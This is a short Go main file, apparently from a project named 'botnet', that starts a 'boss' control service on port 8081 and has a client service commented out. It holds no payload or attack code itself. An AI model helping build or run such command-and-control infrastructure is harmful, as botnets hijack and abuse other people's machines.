package main

import (
	"log"

	"github.com/phanletrunghieu/botnet/server/service/boss"
)

func main() {
	// serviceClient := client.NewClientService(8080)
	// go func() {
	// 	err := <-serviceClient.Error
	// 	log.Println(err)
	// }()

	// go serviceClient.Run()

	// boss
	serviceBoss := boss.NewBossService(8081)
	go func() {
		err := <-serviceBoss.Error
		log.Println(err)
	}()

	serviceBoss.Run()
}
